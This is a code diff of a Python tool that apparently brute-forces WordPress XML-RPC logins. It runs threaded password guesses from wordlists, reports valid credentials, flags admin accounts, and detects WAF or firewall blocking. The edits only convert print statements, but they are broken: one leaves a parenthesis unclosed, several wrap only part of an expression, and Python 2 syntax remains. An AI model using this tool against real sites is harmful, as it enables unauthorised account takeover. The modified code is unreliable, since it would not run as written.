@@ -63,11 +63,11 @@ def worker(wordlist,thread_no,url,userlist,verbose,debug,agent):
 
 def BuildThreads(list_array,url,debug,userlist,verbose,agent):
     if debug:
-        print "Here is the content of the wordlists for each thread"
+        print ("Here is the content of the wordlists for each thread")
         for i in range(len(list_array)):
-            print "Thread " + str(i)
+            print ("Thread ") + str(i)
             printout(str(list_array[i]), YELLOW)
-            print "\n-----------------------------------------------------"
+            print ("\n-----------------------------------------------------")
     threads = []
     for i in range(len(list_array)):
         t = threading.Thread(target=worker, args=(list_array[i], i, url,userlist,verbose,debug,agent))
@@ -95,16 +95,16 @@ def PrintBanner(input,wordlist,url,userlist,passlist):
 
 def TestSite(url):
     protocheck(url)
-    print "Trying: " + url
+    print ("Trying: ") + url
     try:
         urllib2.urlopen(url, timeout=3)
     except urllib2.HTTPError, e:
         if e.code == 405:
-            print url + " found!"
-            print "Now the brute force will begin!  >:)"
+            print url + (" found!")
+            print ("Now the brute force will begin!  >:)")
         if e.code == 404:
             printout(str(e), YELLOW)
-            print " - XMLRPC has been moved, removed, or blocked"
+            print (" - XMLRPC has been moved, removed, or blocked")
             sys.exit()
     except urllib2.URLError, g:
         printout("Could not identify XMLRPC.  Please verify the domain.\n", YELLOW)
@@ -121,7 +121,7 @@ def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
         if debug is True:
             thready = "[Thread " + str(thread_no) + "]"
             printout(thready, YELLOW)
-        print "Trying " + user + " : " + password + "\n",
+        print ("Trying ") + user + (" : ") + password + ("\n"),
     headers = {'User-Agent': agent,
                'Connection': 'keep-alive',
                'Accept': 'text/html'
@@ -135,21 +135,21 @@ def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
         try:
             splitter = the_page.split(look_for, 1)[1]
             correct_pairs[user] = password
-            print "--------------------------"
+            print ("--------------------------")
             success = "[" + user + " : " + password + "] are valid credentials!  "
             adminAlert = ""
             if splitter[23] == "1":
                 adminAlert = "- THIS ACCOUNT IS ADMIN"
             printout(success, GREEN)
             printout(adminAlert, RED)
-            print "\n--------------------------"
+            print ("\n--------------------------")
         except:
             pass
     except urllib2.URLError, e:
         if e.code == 404 or e.code == 403:
             global total
             printout(str(e), YELLOW)
-            print " - WAF or security plugin likely in use"
+            print (" - WAF or security plugin likely in use"
             total = len(passlist)
             sys.exit()
         else:
@@ -161,10 +161,10 @@ def PasswordAttempt(user, password, url, thread_no,verbose,debug,agent):
         printout(str(e), YELLOW)
         print " - Try reducing Thread count "
         if args.verbose is True or args.debug is True:
-            print user + ":" + password + " was skipped"
+            print user + (":") + password + (" was skipped")
     except socket.error as e:
         printout(str(e), YELLOW)
-        print " - Got an RST, Probably tripped the firewall\n",
+        print (" - Got an RST, Probably tripped the firewall\n"),
         total = len(passlist)
         sys.exit()
 
@@ -210,11 +210,11 @@ def main():
             time.sleep(0.1)
             sys.stdout.flush()
             percent = "%.0f%%" % (100 * (total)/len(passlist))
-            print " " + percent + " Percent Complete\r",
+            print (" ") + percent + (" Percent Complete\r"),
     
-    print "\nAll correct pairs:"
+    print ("\nAll correct pairs:")
     printout(str(correct_pairs), GREEN)
-    print ""
+    print ("")
 
 if __name__ == "__main__":
     main()
